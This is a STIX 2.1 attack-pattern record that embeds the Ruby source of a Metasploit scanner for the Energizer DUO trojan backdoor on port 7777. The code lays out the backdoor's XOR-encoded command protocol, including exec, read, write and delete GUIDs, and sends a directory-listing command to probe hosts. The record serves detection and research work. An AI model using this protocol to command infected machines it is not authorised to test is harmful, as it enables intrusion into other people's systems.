{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d5e4ea2f-1a73-4aa0-8679-419622e1e74b",
    "created": "2024-08-14T16:27:09.31015Z",
    "modified": "2024-08-14T16:27:09.310154Z",
    "name": "Energizer DUO Trojan Scanner",
    "description": "Detect instances of the Energizer DUO trojan horse software on port 7777",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/backdoor/energizer_duo_detect.rb",
            "external_id": "energizer_duo_detect.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0103"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'Energizer DUO Trojan Scanner',\n      'Description' => 'Detect instances of the Energizer DUO trojan horse software on port 7777',\n      'Author'      => 'hdm',\n      'References'  =>\n        [\n          ['CVE', '2010-0103'],\n          ['OSVDB', '62782'],\n          ['US-CERT-VU', '154421']\n        ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(7777),\n      ])\n  end\n\n  def trojan_encode(str)\n    str.unpack(\"C*\").map{|c| c ^ 0xE5}.pack(\"C*\")\n  end\n\n  def trojan_command(cmd)\n    cid = \"\"\n\n    case cmd\n    when :exec\n      cid = \"{8AF1C164-EBD6-4b2b-BC1F-64674E98A710}\"\n    when :dir\n      cid = \"{0174D2FC-7CB6-4a22-87C7-7BB72A32F19F}\"\n    when :write\n      cid = \"{98D958FC-D0A2-4f1c-B841-232AB357E7C8}\"\n    when :read\n      cid = \"{F6C43E1A-1551-4000-A483-C361969AEC41}\"\n    when :nop\n      cid = \"{783EACBF-EF8B-498e-A059-F0B5BD12641E}\"\n    when :find\n      cid = \"{EA7A2EB7-1E49-4d5f-B4D8-D6645B7440E3}\"\n    when :yes\n      cid = \"{E2AC5089-3820-43fe-8A4D-A7028FAD8C28}\"\n    when :runonce\n      cid = \"{384EBE2C-F9EA-4f6b-94EF-C9D2DA58FD13}\"\n    when :delete\n      cid = \"{4F4F0D88-E715-4b1f-B311-61E530C2C8FC}\"\n    end\n\n    trojan_encode(\n      [0x27].pack(\"V\") + cid  + \"\\x00\"\n    )\n  end\n\n  def run_host(ip)\n\n    begin\n\n    connect\n    sock.put(trojan_command(:dir))\n    sock.put(\n      trojan_encode(\n        [4].pack(\"V\") + \"C:\\\\\\x00\\x00\"\n      )\n    )\n\n    lbuff = sock.get_once(4, 5)\n    if(not lbuff)\n      print_error(\"#{ip}:#{rport} UNKNOWN: No response to the directory listing request\")\n      disconnect\n      return\n    end\n\n    len   = trojan_encode(lbuff).unpack(\"V\")[0]\n    dbuff = sock.get_once(len, 30)\n    data  = trojan_encode(dbuff)\n    files = data.split(\"|\").map do |x|\n      if x[0,2] == \"?1\"\n        [\"D\", x[2,x.length-2]]\n      else\n        [\"F\", x]\n      end\n    end\n\n    # Required to prevent the server from spinning a loop\n    sock.put(trojan_command(:nop))\n\n    print_good(\"#{ip}:#{rport} FOUND: #{files.inspect}\")\n    # Add Vulnerability and Report\n    report_vuln({\n      :host  => ip,\n      :name  => \"Energizer DUO USB Battery Charger Software Arucer.dll Trojaned Distribution\",\n      :refs  => self.references\n    })\n    report_note(\n      :host   => ip,\n      :proto  => 'tcp',\n      :port   => datastore['RPORT'],\n      :sname  => \"energizer_duo\",\n      :type   => 'Energizer DUO Trojan',\n      :data   => files.inspect\n    )\n    disconnect\n\n    rescue ::Interrupt\n      raise $!\n    rescue ::Rex::ConnectionError, ::IOError\n    end\n\n  end\nend\n"
}